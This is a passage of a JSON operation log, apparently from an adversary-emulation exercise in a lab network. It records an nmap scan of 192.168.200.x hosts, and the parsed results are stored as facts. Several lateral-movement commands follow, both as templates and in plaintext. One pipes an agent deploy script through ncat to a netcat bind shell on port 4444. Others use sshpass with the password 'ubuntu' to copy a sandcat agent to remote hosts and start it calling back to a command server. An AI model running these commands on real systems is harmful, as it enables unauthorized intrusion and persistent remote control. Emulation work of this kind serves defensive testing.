{"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a635240>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6341c0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a634e50>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a637520>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a635600>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6342e0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["4444", "krb524"], ["22", "ssh"]], "unique": "host.remote.port_services[('4444', 'krb524'), ('22', 'ssh')]", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6377f0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6341f0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["8000", "ssh"], ["22", "ssh"]], "unique": "host.remote.port_services[('8000', 'ssh'), ('22', 'ssh')]", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a637670>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6348b0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["4444", "krb524"], ["8000", "ssh"], ["22", "ssh"]], "unique": "host.remote.port_services[('4444', 'krb524'), ('8000', 'ssh'), ('22', 'ssh')]", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a634d30>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a637b50>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a635480>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6357e0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a634190>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a635ea0>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T20:53:07Z", "command": "nmap -sV --version-light -oX - 192.168.200.1,2,3,4,5,6,7", "facts": [{"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T20:53:22Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T20:53:22Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T20:53:22Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17", "0e949644-eb21-44f6-96e6-905f8d8c24b7"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])"]}, {"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])"]}, {"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924"], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["4444", "krb524"], ["22", "ssh"]], "unique": "host.remote.port_services[('4444', 'krb524'), ('22', 'ssh')]", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.port_services", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924"], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["8000", "ssh"], ["22", "ssh"]], "unique": "host.remote.port_services[('8000', 'ssh'), ('22', 'ssh')]", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924"], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["4444", "krb524"], ["8000", "ssh"], ["22", "ssh"]], "unique": "host.remote.port_services[('4444', 'krb524'), ('8000', 'ssh'), ('22', 'ssh')]", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:53:07Z"}, {"deadman": false, "finish": "2023-10-09T20:53:32Z", "executor": {"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "e5197ffc-97fe-4663-91d3-388ab1caa12f", "plaintext_command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.200.3 4444", "used": [{"trait": "host.lateralMove.ip", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.lateralMove.ip192.168.200.3", "created": "2023-10-09T20:53:24Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "4444", "unique": "host.lateralMove.port4444", "created": "2023-10-09T20:53:24Z", "relationships": []}], "unique": "e5197ffc-97fe-4663-91d3-388ab1caa12f", "decide": "2023-10-09T20:53:24Z", "status": 1, "score": 3, "pid": "1877", "relationships": [], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ncshell", "executors": [{"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T9090", "name": "Deception download agent on target through netcat bind shell", "description": "download sandcat agent on a target machine that is listening on a netcat bind shell", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: Netcat Bind Shell"}, "agent_reported_time": "2023-10-09T20:53:26Z", "command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.200.3 4444", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:53:26Z"}, {"deadman": false, "finish": "2023-10-09T20:53:37Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "7ca492c2-de38-44c7-b0fa-d7497606e686", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux activedir@192.168.200.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 activedir@192.168.200.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T20:53:35Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "activedir", "unique": "host.lateralMove.useractivedir", "created": "2023-10-09T20:53:35Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.lateralMove.ip192.168.200.3", "created": "2023-10-09T20:53:34Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T20:53:35Z", "relationships": []}], "unique": "7ca492c2-de38-44c7-b0fa-d7497606e686", "decide": "2023-10-09T20:53:35Z", "status": 1, "score": 15, "pid": "1880", "relationships": [], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T20:53:37Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux activedir@192.168.200.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 activedir@192.168.200.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["7ca492c2-de38-44c7-b0fa-d7497606e686"], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.ip.address192.168.200.3", "created": "2023-10-09T20:53:37Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:53:37Z"}, {"deadman": false, "finish": "2023-10-09T20:53:47Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "d44057ed-9daf-466c-8255-205478b33a74", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux hr@192.168.200.6:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 hr@192.168.200.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T20:53:40Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "hr", "unique": "host.lateralMove.userhr", "created": "2023-10-09T20:53:40Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.6", "unique": "host.lateralMove.ip192.168.200.6", "created": "2023-10-09T20:53:40Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T20:53:40Z", "relationships": []}], "unique": "d44057ed-9daf-466c-8255-205478b33a74", "decide": "2023-10-09T20:53:40Z", "status": 1, "score": 15, "pid": "1884", "relationships": [], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T20:53:47Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux hr@192.168.200.6:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 hr@192.168.200.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["d44057ed-9daf-466c-8255-205478b33a74"], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.6", "unique": "host.ip.address192.168.200.6", "created": "2023-10-09T20:53:47Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": 